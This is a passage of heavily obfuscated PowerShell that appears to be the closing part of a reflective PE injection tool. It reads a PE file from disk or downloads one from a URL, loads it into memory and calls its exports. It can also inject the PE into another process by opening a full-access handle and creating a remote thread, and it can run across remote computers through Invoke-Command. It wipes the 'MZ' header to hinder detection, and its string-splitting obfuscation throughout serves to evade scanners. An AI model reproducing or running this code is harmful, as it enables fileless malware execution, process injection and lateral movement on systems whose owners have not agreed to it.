					&("{4}{1}{0}{3}{2}" -f 'e-W','it','rning','a','Wr') ('Unab'+'le'+' '+'to'+' '+'f'+'ree '+'l'+'i'+'brary: '+"$ImportDllPath. "+'C'+'ontinui'+'n'+'g '+'an'+'ywa'+'ys.') -WarningAction ("{0}{1}{2}"-f 'C','ont','inue')
				}
				
				${IMPORT`D`e`s`cRiPToRP`TR} = &("{2}{0}{5}{3}{4}{1}" -f 'g','ned','Add-Si','edInt','AsUnsig','n') (${imP`O`RTDES`Cripto`RP`TR}) (  ${Lis`m`5T}::"SIze`oF"([Type]${w`iN32`Typ`es}."Ima`GE_`ImpOR`T_`dEs`Cr`iPTor"))
			}
		}
		
		
		&("{2}{1}{3}{0}"-f'erbose','t','Wri','e-V') ("{11}{3}{2}{0}{4}{6}{7}{1}{9}{8}{5}{10}" -f 'ain so th','kn','ng dllm','alli','e ','d','D','LL ','nloa','ows it is being u','ed','C')
		${d`l`lMAi`NPtR} = &("{0}{5}{3}{2}{4}{1}"-f 'Add-','ed','dIntAsUn','gne','sign','Si') (${P`E`InfO}."p`eHAN`dLe") (${pe`IN`FO}."IMa`GE_`Nt`_hEAdERs"."OptI`onAlh`eADEr"."ad`Dr`essOfE`NTrypO`InT")
		${d`lLmA`INdE`LegaTE} = &("{0}{2}{3}{1}" -f'Get','ype','-Delegat','eT') @([IntPtr], [UInt32], [IntPtr]) ([Bool])
		${D`l`lMAIN} =  (  GeT-iTEm  vARiablE:LisM5T ).VALUe::("{1}{0}{5}{2}{6}{4}{3}" -f 'eForFun','GetDelegat','on','ter','in','cti','Po').Invoke(${Dllmai`Np`TR}, ${dl`lMAI`NDELeG`Ate})
		
		${dll`MAin}."I`NvoKe"(${pEI`N`FO}."p`EH`AnDLE", 0,  ${8`zh}::"ze`RO") | &("{1}{0}"-f 'l','Out-Nul')
		
		
		${sUC`ceSS} = ${win32FUn`C`T`io`NS}."VI`RtUaLf`Ree"."i`NV`Oke"(${PeH`ANd`le}, [UInt64]0, ${W`in32`COnstANTs}."m`eM_rE`leASE")
		if (${Su`cC`ess} -eq ${f`AlSE})
		{
			&("{3}{0}{2}{1}"-f'e-Wa','ing','rn','Writ') ((("{13}{10}{8}{7}{1}{12}{6}{5}{4}{2}{0}{3}{11}{9}"-f '. C',' the ','ry','ontinuing ','o','m','{0}s me','e on','lFre','yways.','o call Virtua','an','PE','Unable t'))-f  [ChaR]39) -WarningAction ("{1}{2}{0}"-f 'e','Conti','nu')
		}
	}


	Function m`AIn
	{
		${wIN3`2`FuNc`TIoNs} = &("{3}{2}{1}{0}" -f'ons','i','-Win32Funct','Get')
		${win`3`2TYp`eS} = &("{2}{3}{0}{1}" -f 'Win32Typ','es','G','et-')
		${wI`N32C`onStA`NTs} =  &("{5}{3}{4}{2}{1}{0}" -f 'tants','2Cons','3','e','t-Win','G')
		
		${ReMoTE`PRo`Ch`AnD`lE} =   ( VARIAblE  8ZH ).ValUE::"Z`ERo"
	
		
		if ((${pro`ciD} -ne ${nu`Ll}) -and (${p`R`OCiD} -ne 0) -and (${PROc`Name} -ne ${n`ULl}) -and (${p`ROCN`AmE} -ne ""))
		{
			Throw ((("{11}{2}{7}{14}{6}{8}{4}{9}{5}{12}{13}{3}{16}{0}{10}{15}{1}"-f'one','ther','ly a','oose',' a','rocN','ocI',' P','d','nd P',' or the ','CanFXzt supp','a','me, ch','r','o',' ')) -rEpLAce 'FXz',[ChaR]39)
		}
		elseif (${PRoC`Na`me} -ne ${n`ULl} -and ${pR`Oc`NAmE} -ne "")
		{
			${Pr`OcEss`ES} = @(&("{0}{2}{1}" -f 'Ge','ess','t-Proc') -Name ${PROcn`AMe} -ErrorAction ("{0}{1}{2}{3}" -f'Silent','ly','Contin','ue'))
			if (${PrO`CE`SseS}."Co`UNt" -eq 0)
			{
				Throw ((('CanMa'+'Lt ')  -rEpLaCe  ([ChaR]77+[ChaR]97+[ChaR]76),[ChaR]39)+'fi'+'nd '+'proces'+'s '+"$ProcName")
			}
			elseif (${PrOCE`s`SeS}."Cou`NT" -gt 1)
			{
				${pRO`C`iNFO} = &("{1}{2}{0}"-f 'ess','G','et-Proc') | &("{1}{0}"-f're','whe') { ${_}."n`AmE" -eq ${p`RO`CNAMe} } | &("{0}{2}{1}" -f'Se','ject','lect-Ob') ("{1}{2}{3}{0}" -f 'Name','Pr','o','cess'), ('Id'), ("{2}{0}{1}"-f'essio','nId','S')
				&("{3}{2}{1}{0}"-f 't','pu','e-Out','Writ') ${P`ROciN`Fo}
				Throw ('M'+'ore '+'than'+' '+'on'+'e '+'i'+'n'+'st'+'ance '+'of'+' '+"$ProcName "+'fo'+'u'+'nd, '+'p'+'lea'+'se '+'spe'+'ci'+'fy '+'th'+'e '+'proce'+'s'+'s '+'I'+'D '+'to'+' '+'in'+'jec'+'t '+'i'+'n '+'t'+'o.')
			}
			else
			{
				${PRO`Cid} = ${PrOC`esS`Es}[0]."ID"
			}
		}
		
		
		





		
		if ((${PrOc`id} -ne ${nu`LL}) -and (${PR`o`CiD} -ne 0))
		{
			${ReM`OTEPROcH`A`NDLE} = ${wiN32FUNCTi`O`Ns}."OpEN`pr`OCE`Ss"."IN`VoKE"(0x001F0FFF, ${F`ALSE}, ${P`ROCId})
			if (${REmoTE`P`R`Oc`HAnDle} -eq   ( geT-iTeM VARiable:8zh).VaLUE::"Ze`RO")
			{
				Throw (('Coul'+'d'+'n{0}t ') -f [CHar]39+'obt'+'ain '+'t'+'he '+'ha'+'ndle '+'fo'+'r '+'p'+'rocess '+'ID:'+' '+"$ProcId")
			}
			
			&("{0}{1}{2}"-f'W','rite-Verbos','e') ("{8}{0}{6}{10}{3}{2}{4}{9}{5}{1}{7}"-f't t','nj','e','e remot',' process','to i','he','ect in to','Go',' ',' handle for th')
		}
		

		
		&("{1}{2}{0}" -f'ose','Write-V','erb') ("{1}{2}{6}{3}{5}{4}{7}{0}"-f'brary','Cal','li',' Invok','oadL','e-MemoryL','ng','i')
		${PEh`A`NDle} =   (  geT-vAriAbLe  8zH  -vALu)::"z`ERo"
		if (${rEmOTEP`ROcHa`N`Dle} -eq   ( vAriaBlE ('8z'+'h') -VAlU )::"Ze`Ro")
		{
			${p`ElOA`D`Edi`NFO} = &("{1}{3}{4}{5}{2}{0}{6}"-f 'LoadLibrar','Invo','y','ke-M','em','or','y') -PEBytes ${PEb`ytEs} -ExeArgs ${eX`eAr`GS} -ForceASLR ${ForCe`A`sLR}
		}
		else
		{
			${Pe`LOaDE`dINfO} = &("{4}{1}{0}{3}{2}"-f 'moryLoa','ke-Me','ibrary','dL','Invo') -PEBytes ${pE`BYt`ES} -ExeArgs ${E`XE`ARGs} -RemoteProcHandle ${R`e`m`oTEprOc`HAND`Le} -ForceASLR ${fOR`ceA`sLr}
		}
		if (${P`el`o`ADeDiNFO} -eq   (  ITEm  ("VaRiA"+"b"+"lE"+":8zh")).VAlUE::"ze`RO")
		{
			Throw ("{8}{6}{7}{5}{1}{2}{10}{4}{9}{3}{0}" -f'ed is NULL','e ','to l','turn','d PE','l','na','b','U',', handle re','oa')
		}
		
		${pE`Han`dLe} = ${Pe`LoADEDIn`FO}[0]
		${REmOt`epeH`And`le} = ${P`ElOAD`eDin`FO}[1] 
		
		
		
		${pEIn`Fo} = &("{5}{2}{0}{3}{4}{1}" -f'D','ledInfo','PE','et','ai','Get-') -PEHandle ${Pe`h`ANdLE} -Win32Types ${wi`N3`2Typ`ES} -Win32Constants ${wi`N`32c`ONSTaNts}
		if ((${pein`FO}."f`ile`TYpE" -ieq "DLL") -and (${rEMOTeP`R`ochAN`dLe} -eq   ( GCi  vARiABle:8ZH ).vAlUe::"zE`Ro"))
		{
			
			
			
	        switch (${FUNCretU`R`N`T`yPE})
	        {
	            ("{2}{0}{1}"-f'in','g','WStr') {
	                &("{0}{1}{2}{3}" -f 'Wri','te','-V','erbose') ("{8}{5}{7}{9}{1}{2}{10}{6}{3}{4}{0}"-f 'e','functi','on w',' return t','yp','lli','g','n','Ca','g ','ith WStrin')
				    [IntPtr]${WSTR`ING`FuNcAd`dr} = &("{1}{5}{4}{0}{2}{3}"-f'ryPr','Ge','ocAddre','ss','emo','t-M') -PEHandle ${P`EhAn`dLE} -FunctionName ("{2}{1}{0}{3}"-f'g','n','WStri','Func')
				    if (${WS`TrInG`FUNC`A`ddR} -eq   ( VArIaBlE ('8'+'zh')  -vaLu )::"ze`Ro")
				    {
					    Throw ((("{2}{0}{1}{7}{6}{5}{3}{4}"-f'uldn','O6rt find','Co','dress','.','ion ad','t',' func'))."R`epLa`ce"('O6r',[sTring][Char]39))
				    }
				    ${wS`T`RINGf`UNCDEl`EgaTe} = &("{2}{0}{1}"-f'-DelegateTy','pe','Get') @() ([IntPtr])
				    ${Ws`TR`INg`FuNC} =  ${liS`m`5t}::("{6}{5}{2}{0}{3}{4}{1}"-f'ga','nter','Dele','teForFunction','Poi','et','G').Invoke(${w`STr`inG`FuNcAddr}, ${Ws`TRin`gfun`cD`elEgaTe})
				    [IntPtr]${o`UTP`UTPtR} = ${W`STr`inGFuNc}."Inv`OKe"()
				    ${O`UTp`Ut} =  (gI  ("Vari"+"a"+"BLe:LiSm"+"5"+"t") ).VAluE::("{1}{0}{2}" -f'trToStr','P','ingUni').Invoke(${oUt`PU`Tp`Tr})
				    &("{1}{2}{0}{3}"-f 'te-','Wr','i','Output') ${oU`T`PuT}
	            }

	            ("{1}{0}" -f'g','Strin') {
	                &("{2}{1}{0}"-f'erbose','rite-V','W') ("{10}{12}{0}{5}{6}{7}{3}{8}{11}{9}{2}{1}{4}" -f'i','p','turn ty','nct','e','ng',' ','fu','ion with','tring re','C',' S','all')
				    [IntPtr]${s`TriN`GFUnc`ADDR} = &("{0}{3}{4}{2}{1}" -f 'Ge','ess','r','t-M','emoryProcAdd') -PEHandle ${peH`A`NdLe} -FunctionName ("{2}{1}{0}"-f 'nc','Fu','String')
				    if (${ST`RinGFU`Nc`A`dDr} -eq   ( gEt-CHiLdITeM  VARiaBlE:8Zh ).VAluE::"ZE`Ro")
				    {
					    Throw ((("{1}{4}{6}{5}{2}{3}{0}{8}{7}"-f 'dd','Couldni5Qt fin','n ','a','d fun','tio','c','.','ress')) -crEPLaCE([cHAr]105+[cHAr]53+[cHAr]81),[cHAr]39)
				    }
				    ${strIngFu`NCd`ELE`gATe} = &("{4}{0}{1}{3}{2}" -f 'l','eg','pe','ateTy','Get-De') @() ([IntPtr])
				    ${S`TRi`N`GfunC} =   (vARIABLe  ("L"+"Ism"+"5t") -Val  )::("{0}{2}{5}{1}{4}{3}{6}"-f 'GetDelegateFo','oi','rFunction','te','n','P','r').Invoke(${st`RiN`gfuNC`ADDr}, ${stRI`N`GFuNCDEL`EgatE})
				    [IntPtr]${o`U`TPuTptR} = ${Str`i`NGFunc}."InVO`ke"()
				    ${out`pUt} =   (GET-variable ("l"+"ISm5t") -VA)::("{2}{1}{0}{3}" -f 'tri','rToS','Pt','ngAnsi').Invoke(${Ou`Tp`U`TPtr})
				    &("{1}{2}{0}" -f 'put','Write','-Out') ${Outp`UT}
	            }

	            ("{0}{1}" -f 'V','oid') {
	                &("{1}{0}{3}{2}"-f'e','Writ','ose','-Verb') ("{4}{6}{7}{0}{5}{3}{2}{8}{1}" -f'function with','e','tur','e','Call',' Void r','i','ng ','n typ')
				    [IntPtr]${V`OIDfUN`Caddr} = &("{3}{4}{2}{1}{0}"-f 'rocAddress','P','y','Get-M','emor') -PEHandle ${pE`hAn`dle} -FunctionName ("{2}{0}{1}"-f 'id','Func','Vo')
				    if (${vOi`d`F`UNcADDR} -eq  ${8`ZH}::"zE`RO")
				    {
					    Throw ((("{0}{4}{8}{2}{9}{1}{7}{3}{6}{5}" -f 'Co','nct','b','n','u','address.',' ','io','ldnU0','t find fu'))-rEPLace 'U0b',[cHAR]39)
				    }
				    ${V`Oi`dfUn`cde`L`EGaTE} = &("{3}{2}{1}{0}"-f 'pe','gateTy','Dele','Get-') @() ([Void])
				    ${vO`idf`UNc} =  (  VARiAbLE ("li"+"sM5"+"T") -vaLUeon)::("{2}{6}{7}{8}{3}{5}{1}{4}{0}"-f 'r','rFunctionP','G','g','ointe','ateFo','e','tD','ele').Invoke(${vOId`Fu`N`CAdDR}, ${V`oidfUnc`de`lEgATe})
				    ${voI`D`Fu`Nc}."IN`V`OKe"() | &("{0}{2}{1}" -f 'Out','Null','-')
	            }
	        }
			
			
			
		}
		
		elseif ((${P`EINFO}."fi`lEtY`pe" -ieq "DLL") -and (${REMO`TE`prOc`Ha`NDlE} -ne  ( Dir  ('VAR'+'iaB'+'Le:8zh')).VAlUe::"z`Ero"))
		{
			${voI`d`FUnCA`dDr} = &("{3}{4}{5}{6}{1}{2}{0}"-f'ss','dd','re','Get-Me','moryP','ro','cA') -PEHandle ${pEh`AN`DlE} -FunctionName ("{0}{1}{2}" -f 'VoidF','un','c')
			if ((${vo`I`DFUNc`AdDR} -eq ${nU`Ll}) -or (${VO`idFuNC`A`DdR} -eq   (varIAble  ('8'+'zh') ).VALue::"z`ero"))
			{
				Throw ((("{7}{2}{3}{0}{6}{8}{1}{9}{4}{5}" -f'{0','und','Func',' couldn',' the D','LL','}t be','Void',' fo',' in'))-f[CHar]39)
			}
			
			${V`O`idfUN`cADDR} = &("{1}{3}{5}{0}{4}{2}"-f 'ntAsUnsi','Sub-Signe','d','d','gne','I') ${v`OID`FUnc`A`ddR} ${Pe`handLE}
			${vo`I`dfUNc`ADdR} = &("{3}{2}{6}{4}{5}{1}{0}" -f 'gned','nsi','dd-Sign','A','d','IntAsU','e') ${Vo`IdfUN`cADDR} ${r`EmOt`epEhANdle}
			
			
			${rth`READhANd`lE} = &("{1}{2}{0}{3}"-f'oteT','Cre','ate-Rem','hread') -ProcessHandle ${r`E`Mo`TEPRoCHaN`dlE} -StartAddress ${V`O`iDfUNcAD`DR} -Win32Functions ${WIN`32fUNct`ions}
		}
		
		
        
		if (${R`EMO`TepR`oCha`Ndle} -eq  ( GET-CHIldiTeM  vARIABlE:8zH  ).vALue::"z`erO" -and ${P`E`infO}."fIL`EtYpE" -ieq "DLL")
		{
			&("{1}{5}{0}{3}{2}{4}"-f 'o','Inv','eeL','ryFr','ibrary','oke-Mem') -PEHandle ${Peh`AND`Le}
		}
		else
		{
			
			${succe`Ss} = ${wi`N32fUn`cti`oNS}."viRtual`F`REE"."iNv`oke"(${PEh`An`DlE}, [UInt64]0, ${wiN3`2`COn`Sta`NTs}."m`EM`_RElEAse")
			if (${SU`CC`Ess} -eq ${F`AlSE})
			{
				&("{3}{1}{0}{2}"-f'e','it','-Warning','Wr') ((("{0}{6}{2}{8}{9}{1}{11}{12}{5}{10}{13}{3}{7}{4}"-f 'U','ualFree on','ble to call','w','ys.','uing ','na','a',' ','Virt','an',' the PE3RFs memory.',' Contin','y'))-crePlAce '3RF',[cHAR]39) -WarningAction ("{0}{1}"-f'Co','ntinue')
			}
		}
		
		&("{1}{3}{0}{2}"-f 'os','Writ','e','e-Verb') ("{0}{1}"-f 'D','one!')
	}

	&("{1}{0}" -f 'in','Ma')
}


Function M`AIn
{
	if ((${Ps`c`mDLeT}."my`i`NvoCAT`iON"."Bo`UNDPa`RaM`e`TeRS"[("{0}{1}" -f 'De','bug')] -ne ${NU`lL}) -and ${P`sCm`Dlet}."MYin`VOCA`Ti`on"."BOUnd`PaRAM`eTErs"[("{0}{1}"-f 'De','bug')]."IS`p`ResENt")
	{
		${de`BUGprE`Fe`REncE}  = ("{0}{1}{2}" -f'C','onti','nue')
	}
	
	&("{3}{1}{2}{4}{0}" -f'ose','te-','V','Wri','erb') ('P'+'owe'+'r'+'Shell '+'Proc'+'essID'+': '+"$PID")
	
	if (${P`SC`MDLEt}.paRAmeTerSetNaME -ieq ("{1}{0}{2}"-f 'a','Loc','lFile'))
	{
		&("{2}{1}{0}" -f'ildItem','-Ch','Get') ${pe`PatH} -ErrorAction ("{1}{0}" -f'op','St') | &("{2}{0}{1}" -f'u','ll','Out-N')
		[Byte[]]${p`E`BytES} =   (VAriablE  ('p'+'gZeuq') -vA )::("{2}{3}{1}{0}" -f'AllBytes','d','R','ea').Invoke((&("{1}{3}{0}{2}" -f 'lve','Re','-Path','so') ${PEPA`TH}))
	}
	elseif (${p`SCMdl`eT}.PAraMetErsetnAme -ieq ("{2}{0}{1}" -f 'bFi','le','We'))
	{
		${W`Eb`c`liEnT} = &("{2}{0}{1}"-f'b','ject','New-O') ("{2}{1}{0}{4}{3}" -f 'i','et.WebCl','System.N','nt','e')
		
		[Byte[]]${P`EByTeS} = ${wEbC`L`iE`NT}.("{2}{3}{1}{0}" -f'Data','load','Do','wn').Invoke(${PE`Url})
	}
	
	
	${E_MA`g`IC} = (${PeB`Y`TES}[0..1] | &('%') {[Char] ${_}}) -join ''

    if (${e`_MaG`ic} -ne 'MZ')
    {
        throw ("{0}{4}{1}{5}{3}{2}" -f 'PE is','ot a val','ile.','d PE f',' n','i')
    }

    
	
    ${peBYT`es}[0] = 0
    ${PEbYt`es}[1] = 0
	
	
	if (${e`xeaRgS} -ne ${nU`lL} -and ${Ex`eARgS} -ne '')
	{
		${eXe`ARgs} = ('Ref'+'lectiv'+'eE'+'xe '+"$ExeArgs")
	}
	else
	{
		${E`xE`ARgs} = ("{1}{4}{3}{0}{2}"-f'x','Reflec','e','iveE','t')
	}

	if (${c`Ompu`TERN`AMe} -eq ${Nu`LL} -or ${Comp`U`T`e`RNAme} -imatch "^\s*$")
	{
		&("{0}{1}{3}{2}"-f'Invoke-Co','m','and','m') -ScriptBlock ${R`e`moT`eS`CR`iptbloCK} -ArgumentList @(${P`EBY`TeS}, ${FU`NCrET`U`RNT`yPE}, ${Pr`oc`id}, ${ProcN`AmE},${For`C`e`ASlr})
	}
	else
	{
		&("{2}{1}{3}{4}{0}"-f'd','v','In','oke-Comm','an') -ScriptBlock ${R`emO`TEScript`BlocK} -ArgumentList @(${Pe`BY`Tes}, ${fuN`CretURn`T`Y`pE}, ${P`RO`cID}, ${pR`oc`Name},${FO`R`cEaslr}) -ComputerName ${COm`PuT`eRNAmE}
	}
}

&("{1}{0}"-f'ain','M')
}